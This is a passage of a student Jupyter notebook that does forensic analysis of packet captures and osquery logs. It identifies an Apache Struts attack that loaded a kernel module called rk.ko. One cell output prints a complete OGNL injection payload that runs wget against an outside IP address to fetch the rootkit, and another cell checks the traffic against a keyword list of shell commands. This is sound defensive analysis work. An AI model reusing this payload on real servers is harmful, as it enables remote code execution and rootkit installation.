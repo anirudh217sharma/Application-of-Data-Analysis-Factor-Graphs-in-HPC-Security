{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b>MP3 - Application of Data Analysis & Factor Graphs in HPC Security"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "ERROR: Invalid requirement: '#Installing'\n"
     ]
    }
   ],
   "source": [
    "!pip install pyshark #Installing pyshark"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "ERROR: Invalid requirement: '#installing'\n"
     ]
    }
   ],
   "source": [
    "!pip install seaborn  #installing other necessary packages\n",
    "import seaborn as sns\n",
    "import matplotlib.pyplot as plt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "#installing other necessary packages for file conversion and manipulation\n",
    "import numpy as np\n",
    "import pandas as pd\n",
    "import pyshark\n",
    "from IPython.display import Image\n",
    "import json \n",
    "from pandas.io.json import json_normalize\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "OSI Images from https://en.wikipedia.org/wiki/OSI_model"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Import the pcap files"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "http = pyshark.FileCapture('D:/CS 498/mp3/http.pcap', keep_packets=True)\n",
    "http2 = pyshark.FileCapture('D:/CS 498/mp3/http2.pcap', keep_packets=True)\n",
    "dns = pyshark.FileCapture('D:/CS 498/mp3/dns.pcap', keep_packets=True)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Layer ETH:\n",
      "\tDestination: 02:42:ac:11:00:02\n",
      "\tAddress: 02:42:ac:11:00:02\n",
      "\t.... ..1. .... .... .... .... = LG bit: Locally administered address (this is NOT the factory default)\n",
      "\t.... ...0 .... .... .... .... = IG bit: Individual address (unicast)\n",
      "\tSource: 02:42:63:79:49:dd\n",
      "\t.... ..1. .... .... .... .... = LG bit: Locally administered address (this is NOT the factory default)\n",
      "\t.... ...0 .... .... .... .... = IG bit: Individual address (unicast)\n",
      "\tType: IPv4 (0x0800)\n",
      "\tAddress: 02:42:63:79:49:dd\n"
     ]
    }
   ],
   "source": [
    "ETH = 0\n",
    "IP = 1\n",
    "TCP = 2\n",
    "UDP = 2\n",
    "DNS = 3\n",
    "http[2][ETH].pretty_print()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### User defined function creation"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "###Function for http and http2\n",
    "def dataparse(data):\n",
    "    ETH = 0\n",
    "    IP = 1\n",
    "    TCP = 2\n",
    "    df_data = []\n",
    "    for pkt in data:\n",
    "        if len(pkt.layers) < 3:\n",
    "            continue\n",
    "        if pkt[2].layer_name != 'tcp':\n",
    "            continue\n",
    "\n",
    "        try:\n",
    "            d = {\n",
    "                \n",
    "                'timestamp': pkt.sniff_time.timestamp(),\n",
    "                'length' :pkt.length,\n",
    "                'highest_layer': pkt.highest_layer,\n",
    "                'dest_ip': pkt[IP].dst,\n",
    "                'dest_port': pkt[TCP].dstport,\n",
    "                'content_type':pkt.http.content_type,\n",
    "                'request_uri':pkt.http.request_uri\n",
    "                \n",
    "                }\n",
    "        except:\n",
    "            d = {\n",
    "                'timestamp': pkt.sniff_time.timestamp(),\n",
    "                'length' :pkt.length,\n",
    "                'highest_layer': pkt.highest_layer,\n",
    "                'dest_ip': pkt[IP].dst,\n",
    "                'dest_port': pkt[TCP].dstport,\n",
    "                'content_type': 'NA',\n",
    "                'request_uri':'NA'\n",
    "                \n",
    "                }\n",
    "        df_data.append(d)\n",
    "    df = pd.DataFrame(df_data)\n",
    "    return df"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "def dnsdata(data):\n",
    "    df_data = []\n",
    "    for pkt in data:\n",
    "    #     if len(pkt.layers) < 3:\n",
    "    #         continue\n",
    "    #     if pkt[2].layer_name != 'tcp':\n",
    "    #         continue\n",
    "        try:   \n",
    "            d = {\n",
    "                'timestamp': pkt.sniff_time.timestamp(),\n",
    "                'length' :pkt.length,\n",
    "               'dest_ip': pkt[IP].dst,\n",
    "                'dest_port': pkt[TCP].dstport,\n",
    "                'm':pkt[IP].dst_host,\n",
    "                'src_host': pkt[IP].src_host,\n",
    "                'y': pkt[IP].src,\n",
    "               'Source_port': pkt[UDP].srcport\n",
    "\n",
    "            }\n",
    "        except:\n",
    "             d = {\n",
    "                'timestamp': pkt.sniff_time.timestamp(),\n",
    "                 'length' :pkt.length,\n",
    "                'dest_ip': pkt[IP].dst,\n",
    "                'dest_port': 'NA',\n",
    "                 'm':pkt[IP].dst_host,\n",
    "                'src_host': pkt[IP].src_host,\n",
    "                'y': pkt[IP].src, \n",
    "                'Source_port': 'NA'\n",
    "            }\n",
    "\n",
    "        df_data.append(d)\n",
    "        df = pd.DataFrame(df_data)\n",
    "    return df"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "http_df=dataparse(http)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "http2_df=dataparse(http2)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "dns_df=dnsdata(data=dns)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "OS Query files"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "oslogs=[]\n",
    "with open('D:\\CS 498\\mp3\\osqueryd.results.log','r') as f:\n",
    "    while True:\n",
    "        content=f.readline()\n",
    "        if not content:\n",
    "            break\n",
    "        try:\n",
    "            oslogs.append(json.loads(content))\n",
    "        except:\n",
    "            print('Bad Json')\n",
    "oslogs_query=pd.json_normalize(oslogs)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>name</th>\n",
       "      <th>hostIdentifier</th>\n",
       "      <th>calendarTime</th>\n",
       "      <th>unixTime</th>\n",
       "      <th>epoch</th>\n",
       "      <th>counter</th>\n",
       "      <th>action</th>\n",
       "      <th>decorations.host_uuid</th>\n",
       "      <th>decorations.username</th>\n",
       "      <th>columns.name</th>\n",
       "      <th>...</th>\n",
       "      <th>columns.md5</th>\n",
       "      <th>columns.mode</th>\n",
       "      <th>columns.mtime</th>\n",
       "      <th>columns.sha1</th>\n",
       "      <th>columns.sha256</th>\n",
       "      <th>columns.size</th>\n",
       "      <th>columns.target_path</th>\n",
       "      <th>columns.time</th>\n",
       "      <th>columns.transaction_id</th>\n",
       "      <th>columns.uid</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>system_info</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Tue Feb  6 00:33:05 2018 UTC</td>\n",
       "      <td>1517877185</td>\n",
       "      <td>0</td>\n",
       "      <td>38463</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td>root</td>\n",
       "      <td>rk</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>pack_fim_file_events</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Tue Feb  6 00:33:49 2018 UTC</td>\n",
       "      <td>1517877229</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td>root</td>\n",
       "      <td>NaN</td>\n",
       "      <td>...</td>\n",
       "      <td>0d4f52b9dacac07cf2316d1686cc707c</td>\n",
       "      <td>0644</td>\n",
       "      <td>1517877228</td>\n",
       "      <td>cffc9b8ead76006419975c0d22ba49d5fdf001a0</td>\n",
       "      <td>43d11069f7682e63289f38d184e4193f7486502f099250...</td>\n",
       "      <td>4096</td>\n",
       "      <td>/etc/osquery/.osquery.conf.swp</td>\n",
       "      <td>1517877228</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>pack_fim_file_events</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Tue Feb  6 00:33:49 2018 UTC</td>\n",
       "      <td>1517877229</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td>root</td>\n",
       "      <td>NaN</td>\n",
       "      <td>...</td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td>/etc/osquery/.osquery.conf.swx</td>\n",
       "      <td>1517877228</td>\n",
       "      <td>0</td>\n",
       "      <td></td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>pack_fim_file_events</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Tue Feb  6 00:33:49 2018 UTC</td>\n",
       "      <td>1517877229</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td>root</td>\n",
       "      <td>NaN</td>\n",
       "      <td>...</td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td>/etc/osquery/.osquery.conf.swx</td>\n",
       "      <td>1517877228</td>\n",
       "      <td>0</td>\n",
       "      <td></td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>pack_fim_file_events</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Tue Feb  6 00:33:49 2018 UTC</td>\n",
       "      <td>1517877229</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td>root</td>\n",
       "      <td>NaN</td>\n",
       "      <td>...</td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td>/etc/osquery/.osquery.conf.swx</td>\n",
       "      <td>1517877228</td>\n",
       "      <td>0</td>\n",
       "      <td></td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>5 rows × 27 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                   name hostIdentifier                  calendarTime  \\\n",
       "0           system_info         ubuntu  Tue Feb  6 00:33:05 2018 UTC   \n",
       "1  pack_fim_file_events         ubuntu  Tue Feb  6 00:33:49 2018 UTC   \n",
       "2  pack_fim_file_events         ubuntu  Tue Feb  6 00:33:49 2018 UTC   \n",
       "3  pack_fim_file_events         ubuntu  Tue Feb  6 00:33:49 2018 UTC   \n",
       "4  pack_fim_file_events         ubuntu  Tue Feb  6 00:33:49 2018 UTC   \n",
       "\n",
       "     unixTime epoch counter action                 decorations.host_uuid  \\\n",
       "0  1517877185     0   38463  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "1  1517877229     0       0  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "2  1517877229     0       0  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "3  1517877229     0       0  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "4  1517877229     0       0  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "\n",
       "  decorations.username columns.name  ...                       columns.md5  \\\n",
       "0                 root           rk  ...                               NaN   \n",
       "1                 root          NaN  ...  0d4f52b9dacac07cf2316d1686cc707c   \n",
       "2                 root          NaN  ...                                     \n",
       "3                 root          NaN  ...                                     \n",
       "4                 root          NaN  ...                                     \n",
       "\n",
       "  columns.mode columns.mtime                              columns.sha1  \\\n",
       "0          NaN           NaN                                       NaN   \n",
       "1         0644    1517877228  cffc9b8ead76006419975c0d22ba49d5fdf001a0   \n",
       "2                                                                        \n",
       "3                                                                        \n",
       "4                                                                        \n",
       "\n",
       "                                      columns.sha256 columns.size  \\\n",
       "0                                                NaN          NaN   \n",
       "1  43d11069f7682e63289f38d184e4193f7486502f099250...         4096   \n",
       "2                                                                   \n",
       "3                                                                   \n",
       "4                                                                   \n",
       "\n",
       "              columns.target_path columns.time columns.transaction_id  \\\n",
       "0                             NaN          NaN                    NaN   \n",
       "1  /etc/osquery/.osquery.conf.swp   1517877228                      0   \n",
       "2  /etc/osquery/.osquery.conf.swx   1517877228                      0   \n",
       "3  /etc/osquery/.osquery.conf.swx   1517877228                      0   \n",
       "4  /etc/osquery/.osquery.conf.swx   1517877228                      0   \n",
       "\n",
       "  columns.uid  \n",
       "0         NaN  \n",
       "1           0  \n",
       "2              \n",
       "3              \n",
       "4              \n",
       "\n",
       "[5 rows x 27 columns]"
      ]
     },
     "execution_count": 24,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "oslogs_query.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "###Exporting all to csv\n",
    "http_df.to_csv(\"http_df.csv\")\n",
    "http2_df.to_csv(\"D:\\CS 498\\mp3\\pyshark_tutorial\\http2_df.csv\")\n",
    "dns_df.to_csv(\"dns_df.csv\")\n",
    "oslogs_query.to_csv(\"osquery.csv\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b> Checking which file is the attacker and legitimate one <b>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "def attacker(df):\n",
    "    \"\"\"\n",
    "    Summary:\n",
    "    \n",
    "    This function will check whether a pcap file is of the attacker or is legitimate\n",
    "    \n",
    "    Parameters: \n",
    "    df : dataframe of the pcap file to check\n",
    "\n",
    "    Returns: \n",
    "    A string describing the status of the file\n",
    "    \"\"\"\n",
    "    flag='NA'\n",
    "    for num in df['content_type'].unique():\n",
    "        if '#cmd' in num:\n",
    "            flag=True\n",
    "        else:\n",
    "            flag=False\n",
    "    if flag==True:\n",
    "        print('This file belongs to an attacker')\n",
    "    else:\n",
    "        print('This is a legitimate file')   "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "This file belongs to an attacker\n"
     ]
    }
   ],
   "source": [
    "attacker(http_df)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "This is a legitimate file\n"
     ]
    }
   ],
   "source": [
    "attacker(http2_df)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b>Task 1"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b>Task 1.1a,b,c"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "timestamp                                              1.52139e+09\n",
       "length                                                         358\n",
       "highest_layer                                                 HTTP\n",
       "dest_ip                                                 172.17.0.2\n",
       "dest_port                                                     8080\n",
       "content_type     .multipart/form-data~${#context[\"com.opensymph...\n",
       "request_uri                                       /showcase.action\n",
       "Name: 403, dtype: object"
      ]
     },
     "execution_count": 29,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "http_df[http_df['request_uri']=='/showcase.action'].sort_values(by='timestamp',ascending=True).iloc[0]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b> Task 1.2a "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 152,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>content_type</th>\n",
       "      <th>occurence</th>\n",
       "      <th>content_type_length</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>%{(#_='multipart/form-data').(#dm=@ognl.OgnlCo...</td>\n",
       "      <td>3</td>\n",
       "      <td>818</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>%{(#_='multipart/form-data').(#dm=@ognl.OgnlCo...</td>\n",
       "      <td>1</td>\n",
       "      <td>806</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>%{(#_='multipart/form-data').(#dm=@ognl.OgnlCo...</td>\n",
       "      <td>2</td>\n",
       "      <td>845</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>%{(#_='multipart/form-data').(#dm=@ognl.OgnlCo...</td>\n",
       "      <td>1</td>\n",
       "      <td>810</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>.multipart/form-data~${#context[\"com.opensymph...</td>\n",
       "      <td>3</td>\n",
       "      <td>144</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>application/x-www-form-urlencoded</td>\n",
       "      <td>4</td>\n",
       "      <td>33</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                        content_type  occurence  \\\n",
       "0  %{(#_='multipart/form-data').(#dm=@ognl.OgnlCo...          3   \n",
       "1  %{(#_='multipart/form-data').(#dm=@ognl.OgnlCo...          1   \n",
       "2  %{(#_='multipart/form-data').(#dm=@ognl.OgnlCo...          2   \n",
       "3  %{(#_='multipart/form-data').(#dm=@ognl.OgnlCo...          1   \n",
       "4  .multipart/form-data~${#context[\"com.opensymph...          3   \n",
       "6                  application/x-www-form-urlencoded          4   \n",
       "\n",
       "   content_type_length  \n",
       "0                  818  \n",
       "1                  806  \n",
       "2                  845  \n",
       "3                  810  \n",
       "4                  144  \n",
       "6                   33  "
      ]
     },
     "execution_count": 152,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "content_type=http_df.groupby(['content_type'])['length'].count().to_frame().reset_index()\n",
    "content_type.rename(columns={'length':'occurence'},inplace=True)\n",
    "content_type['content_type_length'] = content_type['content_type'].apply(len)\n",
    "content_type[content_type['content_type']!='NA']"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b>Task 1.2b"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 153,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "whoami is present\n",
      "wget is present\n",
      "ls is present\n",
      "cat is present\n",
      "cd is not present\n",
      "insmod is present\n",
      "ssh is not present\n",
      "lsmod is not present\n"
     ]
    }
   ],
   "source": [
    "for words in ['whoami','wget','ls','cat','cd','insmod','ssh','lsmod']:\n",
    "    x=content_type['content_type'].str.contains(words).sum()\n",
    "    if x>0:\n",
    "        print(\"{} is present\".format(words))\n",
    "    else:\n",
    "        print(\"{} is not present\".format(words))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Wget is a command-line utility for downloading files from the web.<br>\n",
    "The ls command is a command-line utility for listing the contents of a directory or directories given to it via standard input<br>\n",
    "cat command allows us to create single or multiple files, view contain of file, concatenate files and redirect output in terminal or files<br>\n",
    "Insmod is a trivial program used to insert module to the linux kernel in any location"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b>Task 1.3a.1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 74,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "kernel_module=oslogs_query[oslogs_query['name']=='kernel_module']['columns.name'].unique()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b>Task 1.3a.2"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 157,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "\"%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='wget http://162.212.156.148/rk.ko > rk.ko').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\""
      ]
     },
     "execution_count": 157,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "http_df[http_df['content_type'].str.contains(\".ko\",)]['content_type'].iloc[0]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b>The attacker-controlled kernel module is rk.ko"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b> Task 1.3a.3"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 158,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>name</th>\n",
       "      <th>hostIdentifier</th>\n",
       "      <th>calendarTime</th>\n",
       "      <th>unixTime</th>\n",
       "      <th>epoch</th>\n",
       "      <th>counter</th>\n",
       "      <th>action</th>\n",
       "      <th>decorations.host_uuid</th>\n",
       "      <th>decorations.username</th>\n",
       "      <th>columns.name</th>\n",
       "      <th>...</th>\n",
       "      <th>columns.md5</th>\n",
       "      <th>columns.mode</th>\n",
       "      <th>columns.mtime</th>\n",
       "      <th>columns.sha1</th>\n",
       "      <th>columns.sha256</th>\n",
       "      <th>columns.size</th>\n",
       "      <th>columns.target_path</th>\n",
       "      <th>columns.time</th>\n",
       "      <th>columns.transaction_id</th>\n",
       "      <th>columns.uid</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>system_info</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Tue Feb  6 00:33:05 2018 UTC</td>\n",
       "      <td>1517877185</td>\n",
       "      <td>0</td>\n",
       "      <td>38463</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td>root</td>\n",
       "      <td>rk</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>42</th>\n",
       "      <td>kernel_module</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Tue Feb  6 00:34:09 2018 UTC</td>\n",
       "      <td>1517877249</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td></td>\n",
       "      <td>rk</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2882</th>\n",
       "      <td>kernel_module</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Mon Mar 19 15:58:54 2018 UTC</td>\n",
       "      <td>1521475134</td>\n",
       "      <td>0</td>\n",
       "      <td>100</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td>root</td>\n",
       "      <td>rk</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>3 rows × 27 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "               name hostIdentifier                  calendarTime    unixTime  \\\n",
       "0       system_info         ubuntu  Tue Feb  6 00:33:05 2018 UTC  1517877185   \n",
       "42    kernel_module         ubuntu  Tue Feb  6 00:34:09 2018 UTC  1517877249   \n",
       "2882  kernel_module         ubuntu  Mon Mar 19 15:58:54 2018 UTC  1521475134   \n",
       "\n",
       "     epoch counter action                 decorations.host_uuid  \\\n",
       "0        0   38463  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "42       0       0  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "2882     0     100  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "\n",
       "     decorations.username columns.name  ... columns.md5 columns.mode  \\\n",
       "0                    root           rk  ...         NaN          NaN   \n",
       "42                                  rk  ...         NaN          NaN   \n",
       "2882                 root           rk  ...         NaN          NaN   \n",
       "\n",
       "     columns.mtime columns.sha1 columns.sha256 columns.size  \\\n",
       "0              NaN          NaN            NaN          NaN   \n",
       "42             NaN          NaN            NaN          NaN   \n",
       "2882           NaN          NaN            NaN          NaN   \n",
       "\n",
       "     columns.target_path columns.time columns.transaction_id columns.uid  \n",
       "0                    NaN          NaN                    NaN         NaN  \n",
       "42                   NaN          NaN                    NaN         NaN  \n",
       "2882                 NaN          NaN                    NaN         NaN  \n",
       "\n",
       "[3 rows x 27 columns]"
      ]
     },
     "execution_count": 158,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "oslogs_query[(oslogs_query['columns.name']=='rk') & (oslogs_query['action']=='added')]\n",
    "###It shows that the kernel module ko is loaded into the vulnerable server"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b>Task 1.3b"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 159,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array(['/etc/dbus-1/system.d/org.freedesktop.hostname1.conf.dpkg-new',\n",
       "       '/root/.ssh/known_hosts', '/root/.ssh/.known_hosts.swp',\n",
       "       '/root/.ssh/.known_hosts.swpx', '/root/.ssh/known_hosts~'],\n",
       "      dtype=object)"
      ]
     },
     "execution_count": 159,
